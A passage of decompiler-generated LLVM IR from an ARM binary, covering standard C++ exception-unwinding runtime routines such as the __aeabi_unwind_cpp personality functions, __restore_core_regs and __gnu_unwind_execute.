  %v10_189ac = phi i32 [ %arg1, %dec_label_pc_189a4 ], [ 0, %bb ]
  ret i32 %v10_189ac

; uselistorder directives
  uselistorder i1 false, { 0, 1, 2, 3, 28, 29, 30, 45, 23, 27, 46, 47, 48, 49, 50, 5, 4, 51, 42, 43, 31, 32, 24, 35, 34, 33, 36, 6, 8, 7, 20, 44, 25, 26, 12, 39, 19, 21, 22, 11, 10, 9, 13, 14, 15, 37, 16, 17, 18, 41, 38, 40, 52, 53 }
  uselistorder i1* @cpsr_z, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 38, 14, 15, 16, 34, 35, 36, 37, 0, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_189b4 = load i32, i32* @r1, align 4
  %v2_189b4 = load i32, i32* @r2, align 4
  %v4_189b4 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_189b4, i32 %v2_189b4, i32 2)
  ret i32 %v4_189b4
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_189bc = load i32, i32* @r1, align 4
  %v2_189bc = load i32, i32* @r2, align 4
  %v4_189bc = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_189bc, i32 %v2_189bc, i32 1)
  ret i32 %v4_189bc
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_189c4 = load i32, i32* @r1, align 4
  %v2_189c4 = load i32, i32* @r2, align 4
  %v4_189c4 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_189c4, i32 %v2_189c4, i32 0)
  ret i32 %v4_189c4

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 11, 10, 12, 59, 13, 0, 22, 14, 23, 60, 61, 62, 18, 19, 20, 21, 41, 42, 43, 44, 63, 64, 65, 79, 80, 81, 82, 1, 68, 69, 2, 70, 71, 3, 72, 66, 67, 35, 36, 4, 5, 6, 57, 58, 7, 8, 45, 46, 47, 73, 74, 75, 76, 77, 78, 37, 38, 39, 48, 49, 50, 52, 24, 15, 16, 17, 27, 28, 25, 26, 29, 30, 31, 32, 33, 34, 40, 9, 51, 53, 54, 55, 56 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_189cc = add i32 %tmp, 56
  %v4_189cc = inttoptr i32 %v3_189cc to i32*
  %v5_189cc = load i32, i32* %v4_189cc, align 4
  %v6_189cc = add i32 %tmp, 60
  %v7_189cc = inttoptr i32 %v6_189cc to i32*
  %v8_189cc = load i32, i32* %v7_189cc, align 4
  %v2_189d8 = load i32, i32* %arg1, align 4
  %v3_189d8 = add i32 %tmp, 4
  %v4_189d8 = inttoptr i32 %v3_189d8 to i32*
  %v5_189d8 = load i32, i32* %v4_189d8, align 4
  store i32 %v5_189d8, i32* @r1, align 4
  %v12_189d8 = add i32 %tmp, 16
  %v13_189d8 = inttoptr i32 %v12_189d8 to i32*
  %v14_189d8 = load i32, i32* %v13_189d8, align 4
  store i32 %v14_189d8, i32* @r4, align 4
  %v15_189d8 = add i32 %tmp, 20
  %v16_189d8 = inttoptr i32 %v15_189d8 to i32*
  %v17_189d8 = load i32, i32* %v16_189d8, align 4
  store i32 %v17_189d8, i32* @r5, align 4
  %v18_189d8 = add i32 %tmp, 24
  %v19_189d8 = inttoptr i32 %v18_189d8 to i32*
  %v20_189d8 = load i32, i32* %v19_189d8, align 4
  store i32 %v20_189d8, i32* @r6, align 4
  %v21_189d8 = add i32 %tmp, 28
  %v22_189d8 = inttoptr i32 %v21_189d8 to i32*
  %v23_189d8 = load i32, i32* %v22_189d8, align 4
  store i32 %v23_189d8, i32* @r7, align 4
  %v24_189d8 = add i32 %tmp, 32
  %v25_189d8 = inttoptr i32 %v24_189d8 to i32*
  %v26_189d8 = load i32, i32* %v25_189d8, align 4
  store i32 %v26_189d8, i32* @r8, align 4
  %v27_189d8 = add i32 %tmp, 36
  %v28_189d8 = inttoptr i32 %v27_189d8 to i32*
  %v29_189d8 = load i32, i32* %v28_189d8, align 4
  store i32 %v29_189d8, i32* @sb, align 4
  %v30_189d8 = add i32 %tmp, 40
  %v31_189d8 = inttoptr i32 %v30_189d8 to i32*
  %v32_189d8 = load i32, i32* %v31_189d8, align 4
  store i32 %v32_189d8, i32* @sl, align 4
  store i32 %v8_189cc, i32* @ip, align 4
  store i32 %v5_189cc, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_189cc)
  ret i32 %v2_189d8

; uselistorder directives
  uselistorder i32 %v8_189cc, { 1, 0 }
  uselistorder i32 %tmp, { 7, 6, 5, 4, 3, 2, 1, 0, 9, 8 }
  uselistorder i32* @ip, { 42, 43, 44, 45, 12, 13, 5, 0, 48, 6, 7, 46, 47, 10, 11, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 1, 82, 83, 84, 85, 86, 87, 88, 89, 90, 8, 91, 92, 34, 35, 2, 36, 37, 38, 39, 40, 41, 32, 9, 16, 33, 19, 14, 15, 26, 27, 28, 29, 30, 31, 20, 21, 22, 23, 24, 25, 3, 17, 18, 4 }
  uselistorder i32 40, { 32, 28, 29, 30, 31, 11, 33, 3, 12, 7, 8, 4, 14, 2, 9, 6, 13, 15, 10, 16, 17, 18, 5, 19, 20, 0, 21, 23, 22, 24, 1, 25, 27, 26 }
  uselistorder i32* @sb, { 118, 119, 120, 10, 11, 12, 13, 100, 101, 102, 103, 104, 105, 106, 107, 108, 111, 109, 110, 112, 92, 93, 75, 76, 14, 15, 16, 17, 18, 19, 20, 21, 7, 4, 1, 2, 3, 5, 6, 8, 9, 23, 22, 28, 29, 24, 25, 26, 27, 30, 33, 31, 32, 0, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 94, 95, 96, 97, 98, 99, 113, 114, 115, 116, 117 }
  uselistorder i32 36, { 15, 14, 4, 16, 6, 7, 5, 11, 13, 8, 12, 9, 0, 1, 2, 3, 10 }
  uselistorder i32* @r8, { 261, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 1, 260, 0, 31, 262, 10, 263, 32, 33, 34, 35, 18, 19, 20, 21, 22, 23, 24, 25, 26, 3, 27, 28, 29, 30, 36, 37, 38, 39, 11, 264, 15, 16, 4, 17, 196, 197, 5, 198, 199, 200, 224, 225, 226, 227, 228, 9, 229, 230, 231, 232, 233, 234, 235, 236, 183, 184, 185, 186, 168, 169, 170, 171, 172, 147, 148, 149, 150, 40, 41, 42, 43, 12, 84, 85, 86, 87, 88, 44, 45, 46, 47, 89, 90, 91, 92, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 14, 13, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 80, 77, 78, 79, 6, 81, 82, 83, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 7, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 173, 174, 175, 176, 177, 178, 8, 179, 180, 181, 182, 187, 188, 2, 189, 190, 191, 192, 193, 194, 195, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 237, 238, 239, 240, 241, 242 }
  uselistorder i32 32, { 85, 82, 83, 84, 49, 86, 87, 45, 56, 88, 44, 79, 50, 46, 64, 62, 63, 59, 60, 61, 71, 72, 65, 66, 58, 69, 70, 51, 77, 78, 80, 2, 3, 5, 4, 81, 7, 6, 9, 8, 11, 10, 47, 52, 48, 73, 13, 12, 15, 14, 17, 16, 19, 18, 57, 21, 20, 22, 24, 23, 26, 25, 27, 28, 30, 29, 67, 68, 53, 74, 31, 75, 32, 76, 33, 34, 35, 36, 54, 37, 38, 39, 55, 40, 0, 41, 1, 42, 43 }
  uselistorder i32 28, { 50, 10, 33, 51, 30, 52, 53, 54, 55, 7, 34, 35, 31, 32, 39, 11, 36, 12, 47, 48, 49, 8, 13, 17, 21, 0, 19, 14, 20, 15, 22, 16, 23, 1, 24, 2, 25, 3, 26, 4, 27, 5, 28, 6, 29, 9, 18, 38, 37, 40, 41, 42, 43, 44, 45, 46 }
  uselistorder i32 24, { 98, 97, 99, 8, 9, 100, 0, 57, 58, 59, 60, 61, 62, 55, 56, 10, 63, 64, 74, 75, 65, 66, 7, 11, 96, 91, 92, 93, 1, 76, 77, 78, 37, 38, 12, 67, 68, 69, 52, 47, 39, 40, 41, 42, 43, 44, 45, 46, 48, 49, 50, 51, 53, 54, 70, 71, 72, 73, 13, 79, 14, 80, 15, 81, 16, 17, 18, 19, 20, 82, 21, 22, 2, 23, 24, 25, 3, 26, 27, 4, 28, 29, 83, 30, 5, 84, 31, 85, 86, 87, 88, 32, 33, 6, 89, 34, 90, 35, 94, 36, 95 }
  uselistorder i32 20, { 127, 125, 126, 128, 1, 4, 9, 35, 129, 31, 130, 131, 132, 133, 5, 134, 135, 2, 136, 36, 10, 32, 33, 34, 37, 38, 39, 49, 50, 40, 41, 137, 118, 119, 120, 121, 122, 123, 124, 11, 114, 115, 116, 3, 51, 12, 52, 53, 0, 30, 43, 6, 45, 13, 46, 29, 44, 42, 47, 48, 14, 15, 16, 17, 54, 18, 55, 56, 57, 58, 59, 60, 19, 61, 62, 63, 64, 65, 66, 20, 67, 68, 69, 70, 71, 72, 73, 74, 75, 21, 76, 77, 78, 79, 80, 81, 82, 83, 22, 84, 85, 86, 87, 88, 89, 23, 90, 91, 24, 92, 93, 94, 95, 25, 96, 97, 26, 98, 99, 100, 101, 102, 103, 104, 7, 105, 27, 106, 107, 108, 109, 8, 110, 28, 111, 112, 113, 117 }
  uselistorder i32* @r1, { 174, 17, 16, 18, 4, 175, 176, 65, 66, 82, 45, 2, 178, 46, 177, 157, 47, 48, 49, 19, 67, 1, 68, 69, 20, 181, 21, 5, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 6, 199, 200, 70, 72, 73, 74, 75, 76, 77, 78, 79, 80, 71, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 63, 3, 81, 22, 164, 109, 110, 201, 23, 203, 204, 205, 206, 121, 122, 29, 84, 30, 202, 24, 31, 32, 33, 165, 166, 167, 168, 169, 170, 171, 172, 173, 44, 101, 102, 159, 7, 155, 156, 8, 160, 163, 161, 9, 162, 85, 86, 25, 147, 87, 148, 158, 123, 124, 12, 34, 35, 36, 37, 38, 39, 40, 10, 209, 210, 211, 212, 0, 213, 26, 83, 111, 143, 207, 208, 179, 180, 27, 13, 88, 112, 113, 114, 115, 116, 28, 125, 126, 89, 90, 41, 42, 43, 91, 92, 93, 95, 96, 94, 127, 97, 98, 99, 100, 103, 104, 105, 14, 106, 107, 108, 117, 118, 119, 15, 120, 151, 152, 11, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 144, 145, 146, 149, 150, 153, 154 }
  uselistorder i32 60, { 3, 22, 23, 24, 4, 5, 1, 6, 15, 16, 17, 18, 19, 20, 7, 11, 12, 8, 13, 14, 9, 10, 0, 2, 21 }
  uselistorder i32 56, { 3, 31, 32, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 9, 8, 2, 10, 11, 12, 13, 14, 28, 29, 25, 26, 4, 5, 1, 6, 0, 7, 27, 30 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_189e8 = load i32, i32* @r0, align 4
  ret i32 %v1_189e8
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_189f0 = load i32, i32* @r0, align 4
  ret i32 %v1_189f0
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18a04 = ptrtoint i32* %stack_var_-68 to i32
  %v2_18a08 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_18a04, i32 0)
  ret i32 %v2_18a08

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18a28 = ptrtoint i32* %stack_var_-68 to i32
  %v2_18a2c = call i32 @__gnu_Unwind_Resume(i32 %v2_18a28, i32 0)
  ret i32 %v2_18a2c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18a4c = ptrtoint i32* %stack_var_-68 to i32
  %v2_18a50 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_18a4c, i32 0)
  ret i32 %v2_18a50

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18a70 = ptrtoint i32* %stack_var_-68 to i32
  %v6_18a74 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_18a70, i32 %arg2, i8* %arg3, i32 %v2_18a70)
  ret i32 %v6_18a74

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_18aa0 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_18aa8 = add i32 %tmp1, 76
  %v2_18aa8 = inttoptr i32 %v1_18aa8 to i32*
  %v3_18aa8 = load i32, i32* %v2_18aa8, align 4
  %v1_18aac = add i32 %v3_18aa8, 7
  %v2_18aac = inttoptr i32 %v1_18aac to i8*
  %v3_18aac = load i8, i8* %v2_18aac, align 1
  %v4_18aac = zext i8 %v3_18aac to i32
  %v1_18ab0 = add i32 %v3_18aa8, 8
  %v3_18ab4 = mul nuw nsw i32 %v4_18aac, 4
  %v2_18ab8 = add i32 %v3_18ab4, %v1_18ab0
  %v3_18ab8 = inttoptr i32 %v2_18ab8 to i8*
  ret i8* %v3_18ab8
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_13* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_13* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_18ac8 = load i32, i32* @r6, align 4
  %v21_18ac8 = load i32, i32* @lr, align 4
  %v0_18acc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18acc, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_18adc

dec_label_pc_18adc:                               ; preds = %dec_label_pc_18adc.backedge, %entry
  %v3_18ae8 = phi i32 [ %v0_18adc.pre, %dec_label_pc_18adc.backedge ], [ %tmp, %entry ]
  %v1_18adc = add i32 %v3_18ae8, 8
  %v2_18adc = inttoptr i32 %v1_18adc to i8*
  %v3_18adc = load i8, i8* %v2_18adc, align 1
  %v4_18adc = zext i8 %v3_18adc to i32
  store i32 %v4_18adc, i32* %r3.global-to-local, align 4
  %v2_18ae0 = icmp eq i8 %v3_18adc, 0
  store i1 %v2_18ae0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18ae0, label %dec_label_pc_18af0, label %.thread

.thread:                                          ; preds = %dec_label_pc_18adc
  %v2_18ae4 = add nsw i32 %v4_18adc, -1
  store i32 %v2_18ae4, i32* %r3.global-to-local, align 4
  %v2_18ae8 = trunc i32 %v2_18ae4 to i8
  store i8 %v2_18ae8, i8* %v2_18adc, align 1
  %v0_18aec.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18aec.pr.pr, label %.thread.dec_label_pc_18af0_crit_edge, label %dec_label_pc_18b18

.thread.dec_label_pc_18af0_crit_edge:             ; preds = %.thread
  %v0_18af0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18af0

dec_label_pc_18af0:                               ; preds = %.thread.dec_label_pc_18af0_crit_edge, %dec_label_pc_18adc
  %v0_18af0 = phi i32 [ %v0_18af0.pre, %.thread.dec_label_pc_18af0_crit_edge ], [ %v3_18ae8, %dec_label_pc_18adc ]
  %v1_18af0 = add i32 %v0_18af0, 9
  %v2_18af0 = inttoptr i32 %v1_18af0 to i8*
  %v3_18af0 = load i8, i8* %v2_18af0, align 1
  %v4_18af0 = zext i8 %v3_18af0 to i32
  store i32 %v4_18af0, i32* %r3.global-to-local, align 4
  %v2_18af4 = icmp eq i8 %v3_18af0, 0
  store i1 %v2_18af4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18af4, label %dec_label_pc_18bf8, label %dec_label_pc_18afc

dec_label_pc_18afc:                               ; preds = %dec_label_pc_18bec, %dec_label_pc_18af0
  %v2_18b00 = phi i32 [ %v0_18bec, %dec_label_pc_18bec ], [ %v0_18af0, %dec_label_pc_18af0 ]
  %v0_18afc = phi i32 [ %v4_18bec, %dec_label_pc_18bec ], [ %v4_18af0, %dec_label_pc_18af0 ]
  %v1_18afc = add nsw i32 %v0_18afc, -1
  store i32 %v1_18afc, i32* %r3.global-to-local, align 4
  %v1_18b00 = trunc i32 %v1_18afc to i8
  %v3_18b00 = add i32 %v2_18b00, 9
  %v4_18b00 = inttoptr i32 %v3_18b00 to i8*
  store i8 %v1_18b00, i8* %v4_18b00, align 1
  %v0_18b04 = load i32, i32* @r5, align 4
  %v1_18b04 = add i32 %v0_18b04, 4
  %v2_18b04 = inttoptr i32 %v1_18b04 to i32*
  %v3_18b04 = load i32, i32* %v2_18b04, align 4
  store i32 %v3_18b04, i32* %r2.global-to-local, align 4
  %v1_18b08 = inttoptr i32 %v3_18b04 to i32*
  %v2_18b08 = load i32, i32* %v1_18b08, align 4
  store i32 %v2_18b08, i32* %r0.global-to-local, align 4
  %v4_18b08 = add i32 %v3_18b04, 4
  store i32 %v4_18b08, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_18b10 = inttoptr i32 %v0_18b04 to i32*
  store i32 %v2_18b08, i32* %v1_18b10, align 4
  %v5_18b10 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18b10, i32* %v2_18b04, align 4
  %v0_18b14 = load i32, i32* %r3.global-to-local, align 4
  %v1_18b14 = trunc i32 %v0_18b14 to i8
  %v2_18b14 = load i32, i32* @r5, align 4
  %v3_18b14 = add i32 %v2_18b14, 8
  %v4_18b14 = inttoptr i32 %v3_18b14 to i8*
  store i8 %v1_18b14, i8* %v4_18b14, align 1
  br label %dec_label_pc_18b18

dec_label_pc_18b18:                               ; preds = %.thread, %dec_label_pc_18afc, %.thread6
  %v0_18b18 = load i32, i32* @r5, align 4
  %v1_18b18 = inttoptr i32 %v0_18b18 to i32*
  %v2_18b18 = load i32, i32* %v1_18b18, align 4
  %v3_18b1c = udiv i32 %v2_18b18, 16777216
  store i32 %v3_18b1c, i32* @r4, align 4
  store i32 %v3_18b1c, i32* %ip.global-to-local, align 4
  %v3_18b24 = mul i32 %v2_18b18, 256
  store i32 %v3_18b24, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_18b18, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_18b24, i32* %v1_18b18, align 4
  br i1 %tmp183, label %dec_label_pc_18bf8, label %dec_label_pc_18b34

dec_label_pc_18b34:                               ; preds = %dec_label_pc_18b18
  %v0_18b34 = load i32, i32* @r4, align 4
  %v1_18b34 = and i32 %v0_18b34, 128
  store i32 %v1_18b34, i32* %r1.global-to-local, align 4
  %v2_18b34 = icmp eq i32 %v1_18b34, 0
  store i1 %v2_18b34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b34, label %dec_label_pc_18c10, label %dec_label_pc_18b3c

dec_label_pc_18b3c:                               ; preds = %dec_label_pc_18b34
  %v1_18b3c = and i32 %v0_18b34, 240
  store i32 %v1_18b3c, i32* @r6, align 4
  %v7_18b40 = icmp eq i32 %v1_18b3c, 128
  store i1 %v7_18b40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18b40, label %dec_label_pc_18b48, label %dec_label_pc_18c6c

dec_label_pc_18b48:                               ; preds = %dec_label_pc_18b3c
  %v0_18b48 = load i32, i32* @r5, align 4
  %v1_18b48 = add i32 %v0_18b48, 8
  %v2_18b48 = inttoptr i32 %v1_18b48 to i8*
  %v3_18b48 = load i8, i8* %v2_18b48, align 1
  %v4_18b48 = zext i8 %v3_18b48 to i32
  store i32 %v4_18b48, i32* %r3.global-to-local, align 4
  %v2_18b4c = icmp eq i8 %v3_18b48, 0
  store i1 %v2_18b4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b4c, label %dec_label_pc_18b5c, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18b48
  %v2_18b50 = add nsw i32 %v4_18b48, -1
  store i32 %v2_18b50, i32* %r3.global-to-local, align 4
  %v2_18b54 = trunc i32 %v2_18b50 to i8
  store i8 %v2_18b54, i8* %v2_18b48, align 1
  %v0_18b58.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18b58.pr.pr, label %.thread3.dec_label_pc_18b5c_crit_edge, label %dec_label_pc_18b8c

.thread3.dec_label_pc_18b5c_crit_edge:            ; preds = %.thread3
  %v0_18b5c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18b5c

dec_label_pc_18b5c:                               ; preds = %.thread3.dec_label_pc_18b5c_crit_edge, %dec_label_pc_18b48
  %v2_18b70 = phi i32 [ %v0_18b5c.pre, %.thread3.dec_label_pc_18b5c_crit_edge ], [ %v0_18b48, %dec_label_pc_18b48 ]
  %v1_18b5c = add i32 %v2_18b70, 9
  %v2_18b5c = inttoptr i32 %v1_18b5c to i8*
  %v3_18b5c = load i8, i8* %v2_18b5c, align 1
  %v4_18b5c = zext i8 %v3_18b5c to i32
  store i32 %v4_18b5c, i32* %r3.global-to-local, align 4
  %v2_18b60 = icmp eq i8 %v3_18b5c, 0
  store i1 %v2_18b60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18b60, label %dec_label_pc_18b9c, label %dec_label_pc_18b6c

dec_label_pc_18b6c:                               ; preds = %dec_label_pc_18b5c
  %v1_18b6c = add nsw i32 %v4_18b5c, -1
  store i32 %v1_18b6c, i32* %r3.global-to-local, align 4
  %v1_18b70 = trunc i32 %v1_18b6c to i8
  store i8 %v1_18b70, i8* %v2_18b5c, align 1
  %v0_18b74 = load i32, i32* @r5, align 4
  %v1_18b74 = add i32 %v0_18b74, 4
  %v2_18b74 = inttoptr i32 %v1_18b74 to i32*
  %v3_18b74 = load i32, i32* %v2_18b74, align 4
  store i32 %v3_18b74, i32* %r2.global-to-local, align 4
  %v1_18b78 = inttoptr i32 %v3_18b74 to i32*
  %v2_18b78 = load i32, i32* %v1_18b78, align 4
  store i32 %v2_18b78, i32* %r0.global-to-local, align 4
  %v4_18b78 = add i32 %v3_18b74, 4
  store i32 %v4_18b78, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18b78, i32* %v2_18b74, align 4
  %v0_18b84 = load i32, i32* %r3.global-to-local, align 4
  %v1_18b84 = trunc i32 %v0_18b84 to i8
  %v2_18b84 = load i32, i32* @r5, align 4
  %v3_18b84 = add i32 %v2_18b84, 8
  %v4_18b84 = inttoptr i32 %v3_18b84 to i8*
  store i8 %v1_18b84, i8* %v4_18b84, align 1
  %v0_18b88 = load i32, i32* %r0.global-to-local, align 4
  %v1_18b88 = load i32, i32* @r5, align 4
  %v2_18b88 = inttoptr i32 %v1_18b88 to i32*
  store i32 %v0_18b88, i32* %v2_18b88, align 4
  br label %dec_label_pc_18b8c

dec_label_pc_18b8c:                               ; preds = %.thread3, %dec_label_pc_18b6c
  %v0_18b8c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_18b8c, i32* %r3.global-to-local, align 4
  %v3_18b90 = mul i32 %v0_18b8c, 256
  store i32 %v3_18b90, i32* %r0.global-to-local, align 4
  %v1_18b94 = load i32, i32* @r5, align 4
  %v2_18b94 = inttoptr i32 %v1_18b94 to i32*
  store i32 %v3_18b90, i32* %v2_18b94, align 4
  %v0_18b98 = load i32, i32* %r3.global-to-local, align 4
  %v3_18b98 = udiv i32 %v0_18b98, 16777216
  br label %dec_label_pc_18b9c

dec_label_pc_18b9c:                               ; preds = %dec_label_pc_18b5c, %dec_label_pc_18b8c
  %storemerge133 = phi i32 [ %v3_18b98, %dec_label_pc_18b8c ], [ 176, %dec_label_pc_18b5c ]
  %v1_18b9c = load i32, i32* %ip.global-to-local, align 4
  %v4_18b9c = mul i32 %v1_18b9c, 256
  %v5_18b9c = or i32 %v4_18b9c, %storemerge133
  store i32 %v5_18b9c, i32* %r2.global-to-local, align 4
  %v7_18ba0 = icmp eq i32 %v5_18b9c, 32768
  store i1 %v7_18ba0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ba0, label %dec_label_pc_18dac, label %dec_label_pc_18ba8

dec_label_pc_18ba8:                               ; preds = %dec_label_pc_18b9c
  %v3_18ba8 = mul i32 %v5_18b9c, 16
  store i32 %v3_18ba8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_18bb8 = and i32 %v3_18ba8, 65520
  store i32 %v3_18bb8, i32* %r2.global-to-local, align 4
  %v0_18bbc = load i32, i32* @r7, align 4
  store i32 %v0_18bbc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_18bc4 = call i32 @_Unwind_VRS_Pop(i32 %v0_18bbc, i32 %v3_18bb8, i32 0, i32 0)
  store i32 %v4_18bc4, i32* %r0.global-to-local, align 4
  %v2_18bc8 = icmp eq i32 %v4_18bc4, 0
  store i1 %v2_18bc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18bc8, label %dec_label_pc_18bd0, label %dec_label_pc_18dac

dec_label_pc_18bd0:                               ; preds = %dec_label_pc_18ba8
  %v0_18bd0 = load i32, i32* @r5, align 4
  %v1_18bd0 = add i32 %v0_18bd0, 8
  %v2_18bd0 = inttoptr i32 %v1_18bd0 to i8*
  %v3_18bd0 = load i8, i8* %v2_18bd0, align 1
  %v4_18bd0 = zext i8 %v3_18bd0 to i32
  store i32 %v4_18bd0, i32* %r3.global-to-local, align 4
  %v0_18bd4 = load i32, i32* @r4, align 4
  %v1_18bd4 = and i32 %v0_18bd4, 32768
  %v2_18bd4 = icmp eq i32 %v1_18bd4, 0
  store i1 %v2_18bd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18bd4, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_18bd0
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18bd0, %bb147
  %v2_18bdc = icmp eq i8 %v3_18bd0, 0
  store i1 %v2_18bdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18bdc, label %dec_label_pc_18bec, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_18be0 = add nsw i32 %v4_18bd0, -1
  store i32 %v2_18be0, i32* %r3.global-to-local, align 4
  %v2_18be4 = trunc i32 %v2_18be0 to i8
  store i8 %v2_18be4, i8* %v2_18bd0, align 1
  %v0_18be8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18be8.pr.pr, label %.thread6.dec_label_pc_18bec_crit_edge, label %dec_label_pc_18b18

.thread6.dec_label_pc_18bec_crit_edge:            ; preds = %.thread6
  %v0_18bec.pre = load i32, i32* @r5, align 4
